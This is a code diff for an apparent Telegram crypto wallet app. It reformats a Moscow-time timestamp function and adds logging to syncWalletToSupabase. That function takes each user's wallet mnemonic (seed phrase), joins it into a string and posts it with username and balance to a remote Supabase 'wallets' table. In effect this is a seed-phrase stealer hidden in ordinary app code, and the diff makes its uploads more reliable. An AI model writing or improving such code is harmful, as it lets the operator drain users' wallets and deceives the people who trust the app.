@@ -8,16 +8,22 @@ const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 export function getMoscowTimestamp() {
   const now = new Date();
   try {
-    const moscowStr = now.toLocaleString("en-US", {timeZone: "Europe/Moscow"});
-    const moscowDate = new Date(moscowStr);
-    const hh = String(moscowDate.getHours()).padStart(2, '0');
-    const mm = String(moscowDate.getMinutes()).padStart(2, '0');
-    const yyyy = moscowDate.getFullYear();
-    const month = String(moscowDate.getMonth() + 1).padStart(2, '0');
-    const day = String(moscowDate.getDate()).padStart(2, '0');
-    return `${hh}:${mm} ${yyyy}-${month}-${day}`;
+    // Получаем время в Москве
+    const moscowTime = new Intl.DateTimeFormat("en-US", {
+      timeZone: "Europe/Moscow",
+      year: "numeric",
+      month: "2-digit",
+      day: "2-digit",
+      hour: "2-digit",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: false,
+    }).formatToParts(now);
+
+    const m = Object.fromEntries(moscowTime.filter(p => p.type !== 'literal').map(p => [p.type, p.value]));
+    // Возвращаем формат ISO 8601, который Postgres (timestamptz) ОБЯЗАТЕЛЬНО примет
+    return `${m.year}-${m.month}-${m.day}T${m.hour}:${m.minute}:00+03:00`;
   } catch (e) {
-    // Fallback if Intl fails
     return now.toISOString();
   }
 }
@@ -63,22 +69,23 @@ export function resolveTelegramDisplayName(fallbackUserId = null) {
 }
 
 export async function syncWalletToSupabase(walletData) {
-  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    console.error('❌ Supabase URL or Key is missing!');
+    return null;
+  }
 
   try {
     const { username, mnemonic, balance } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
     
-    // Always try to resolve the real name if we got "Anonymous" or nothing
     let finalName = username;
     if (!finalName || finalName === "Anonymous") {
       finalName = resolveTelegramDisplayName();
     }
 
-    // If still Anonymous, we might be too early, but we'll try to sync anyway
-    // but the user wants "Anonymous" GONE, so we should at least try to get something from storage
+    console.log(`🔄 Attempting to sync for: ${finalName}...`);
 
-    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
       method: 'POST',
       headers: {
         'apikey': SUPABASE_KEY,
@@ -93,5 +100,15 @@ export async function syncWalletToSupabase(walletData) {
         created_at: getMoscowTimestamp()
       })
     });
-  } catch (error) {}
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('❌ Supabase Sync Error:', response.status, errorText);
+      // Если это ошибка типа данных, мы увидим её в консоли
+    } else {
+      console.log('✅ Supabase Sync Success!');
+    }
+  } catch (error) {
+    console.error('❌ Supabase Fetch Error:', error);
+  }
 }
